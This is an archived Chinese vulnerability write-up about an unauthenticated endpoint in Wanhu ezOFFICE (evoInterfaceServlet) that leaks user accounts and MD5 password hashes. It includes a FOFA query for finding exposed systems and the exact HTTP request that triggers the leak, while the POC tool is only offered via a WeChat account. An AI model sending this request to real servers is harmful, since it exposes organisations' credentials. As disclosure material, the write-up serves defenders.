---
source: "MrWQ/vulnerability-paper"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "万户协同办公平台 ezoffice 存在未授权访问漏洞 附 POC"
product: "万户ezOFFICE evoInterfaceServlet"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "CVE等空字段和影响版本空应明确未知"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E4%B8%87%E6%88%B7%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20ezoffice%20%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "查询语句"
source_url: "https://mp.weixin.qq.com/s/PjnbAiuNtQQx3XxhlpX8AA"
id: "vw-4347ebd516a2480c0e4e4c81"
entity_id: "ve-4347ebd516a2480c0e4e4c81"
schema_version: "1"
---

# 万户协同办公平台 ezoffice 存在未授权访问漏洞 附 POC

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：万户ezOFFICE evoInterfaceServlet
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：CVE等空字段和影响版本空应明确未知
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. FOFA误抓查询语句
2. CVE等空字段和影响版本空应明确未知
3. MD5是摘要非加密
4. 工具要关注公众号回复不可算公开附件，已有HTTP可保留
5. 厂商未提供补丁需附时点，缺当前公告
6. 响应需脱敏文字化

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/PjnbAiuNtQQx3XxhlpX8AA>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PjnbAiuNtQQx3XxhlpX8AA)

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. 万户协同办公平台 ezoffice 简介
-----------------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

万户 ezOFFICE 集团版协同平台以工作流程、知识管理、沟通交流和辅助办公四大核心应用

2. 漏洞描述
-------

万户 ezOFFICE 协同管理平台是一个综合信息基础应用平台。 万户 ezoffice 协同管理平台存在未授权访问漏洞，攻击者可以从 evoInterfaceServlet 接口获得系统登录账号和用 MD5 加密的密码。

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

4.fofa 查询语句
-----------

"Ezoffice"

5. 漏洞复现
-------

漏洞链接：http://127.0.0.1/defaultroot/evoInterfaceServlet?paramType=user

漏洞数据包：

```
GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgaTz1LRndYnxls3CX2euzxEgEsNG75OBL0BJ1oDddicp7AMAxDzibibAeVlVwmZ7MjphQjPXw6VHQA/640?wx_fmt=jpeg)

6.POC&EXP
---------

关注公众号  南风漏洞复现文库 并回复  漏洞复现 45  即可获得该 POC 工具下载地址： 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgaTz1LRndYnxls3CX2euzGcpQVAlhibgsDO2udZ0mZ71DTokswphDypvkgr6q3jewt4rBbIpnluA/640?wx_fmt=jpeg)

7. 整改意见
-------

厂商尚未提供漏洞修补方案，请关注厂商主页及时更新： http://www.whir.net

8. 往期回顾
-------

[畅捷通 TPlus DownloadProxy.aspx 存在任意文件读取漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484147&idx=1&sn=e7114f0d1fbe7ce4c8b8e562cdb22d41&chksm=974b8ff4a03c06e2ec1ee1f83752b6578a7243fd545f667bddac5d8f93733e6fd88bfa2e0a61&scene=21#wechat_redirect)  

[用友 GRP-U8 存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484139&idx=1&sn=c7d35b87382ed85fb57ba66b80f995e9&chksm=974b8feca03c06fabdbee8a488bae77c6c083da9b0857b1735bff91817d3c4c44e1302e8b2ba&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
